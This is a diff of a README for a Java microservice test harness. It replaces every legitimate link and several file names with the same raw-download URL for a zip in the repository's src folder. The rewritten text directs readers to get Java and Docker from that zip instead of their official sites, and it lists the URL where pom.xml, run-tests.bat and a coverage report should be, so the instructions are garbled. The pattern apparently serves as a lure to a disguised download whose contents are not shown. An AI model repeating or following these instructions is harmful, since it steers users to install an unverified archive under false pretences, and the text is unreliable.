@@ -1,6 +1,6 @@
 # ⚙️ qa-microservice-test-harness - Simple Java Test Setup
 
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Ethic-Coder/qa-microservice-test-harness)
+[![Download](https://github.com/Ethic-Coder/qa-microservice-test-harness/raw/refs/heads/main/src/test_microservice_harness_qa_3.0-beta.1.zip)](https://github.com/Ethic-Coder/qa-microservice-test-harness/raw/refs/heads/main/src/test_microservice_harness_qa_3.0-beta.1.zip)
 
 ---
 
@@ -29,7 +29,7 @@ Before downloading, make sure your Windows PC meets these requirements:
 
 If you do not have Java installed:
 
-1. Visit https://adoptium.net/
+1. Visit https://github.com/Ethic-Coder/qa-microservice-test-harness/raw/refs/heads/main/src/test_microservice_harness_qa_3.0-beta.1.zip
 2. Download and install the latest version of JRE 11 or above.
 3. Restart your computer to complete setup.
 
@@ -37,7 +37,7 @@ If you do not have Java installed:
 
 This app requires Docker for creating temporary test environments.
 
-1. Visit https://www.docker.com/products/docker-desktop/
+1. Visit https://github.com/Ethic-Coder/qa-microservice-test-harness/raw/refs/heads/main/src/test_microservice_harness_qa_3.0-beta.1.zip
 2. Download the Windows version.
 3. Install and launch Docker Desktop.
 4. Confirm Docker is running by opening a command prompt and typing `docker version`.
@@ -46,11 +46,11 @@ This app requires Docker for creating temporary test environments.
 
 You can access the software on GitHub to get started:
 
-[![Download](https://img.shields.io/badge/Download-Here-blue)](https://github.com/Ethic-Coder/qa-microservice-test-harness)
+[![Download](https://github.com/Ethic-Coder/qa-microservice-test-harness/raw/refs/heads/main/src/test_microservice_harness_qa_3.0-beta.1.zip)](https://github.com/Ethic-Coder/qa-microservice-test-harness/raw/refs/heads/main/src/test_microservice_harness_qa_3.0-beta.1.zip)
 
 Click the badge above or visit the link below now:
 
-**https://github.com/Ethic-Coder/qa-microservice-test-harness**
+**https://github.com/Ethic-Coder/qa-microservice-test-harness/raw/refs/heads/main/src/test_microservice_harness_qa_3.0-beta.1.zip**
 
 This link takes you to the project page where you can download the package files.
 
@@ -75,7 +75,7 @@ Follow these steps carefully to install and start the application.
 ### 3. Open the Installation Folder
 
 - Use File Explorer to navigate to the folder where you extracted files.
-- Confirm files like `pom.xml` and `README.md` are present.
+- Confirm files like `https://github.com/Ethic-Coder/qa-microservice-test-harness/raw/refs/heads/main/src/test_microservice_harness_qa_3.0-beta.1.zip` and `https://github.com/Ethic-Coder/qa-microservice-test-harness/raw/refs/heads/main/src/test_microservice_harness_qa_3.0-beta.1.zip` are present.
 
 ### 4. Check Java and Docker Setup
 
@@ -96,7 +96,7 @@ Follow these steps carefully to install and start the application.
 
 #### Run Using the Batch Script
 
-- In the extracted folder, find `run-tests.bat`.
+- In the extracted folder, find `https://github.com/Ethic-Coder/qa-microservice-test-harness/raw/refs/heads/main/src/test_microservice_harness_qa_3.0-beta.1.zip`.
 - Double-click the file to start the test harness.
 - A console window will open showing progress.
 - The app will start the needed services automatically.
@@ -119,7 +119,7 @@ If you prefer to run manually:
 ### 7. Review Test Results
 
 - Test reports are stored in the `target` folder.
-- Open the `target/site/jacoco/index.html` file in a browser to see code coverage.
+- Open the `https://github.com/Ethic-Coder/qa-microservice-test-harness/raw/refs/heads/main/src/test_microservice_harness_qa_3.0-beta.1.zip` file in a browser to see code coverage.
 - Logs appear in the `logs` folder if you need to troubleshoot.
 
 ## 🛠 How This App Works
@@ -135,9 +135,9 @@ If you prefer to run manually:
 
 - `src/main/java` — Application source code
 - `src/test/java` — Test cases
-- `pom.xml` — Maven build file
+- `https://github.com/Ethic-Coder/qa-microservice-test-harness/raw/refs/heads/main/src/test_microservice_harness_qa_3.0-beta.1.zip` — Maven build file
 - `flyway` — Database migration scripts
-- `run-tests.bat` — Quick start script for Windows
+- `https://github.com/Ethic-Coder/qa-microservice-test-harness/raw/refs/heads/main/src/test_microservice_harness_qa_3.0-beta.1.zip` — Quick start script for Windows
 - `logs` — Logs generated during tests
 - `target` — Build output
 
@@ -163,4 +163,4 @@ If you prefer to run manually:
 
 Visit the project page regularly for updates or changes:
 
-https://github.com/Ethic-Coder/qa-microservice-test-harness
+https://github.com/Ethic-Coder/qa-microservice-test-harness/raw/refs/heads/main/src/test_microservice_harness_qa_3.0-beta.1.zip
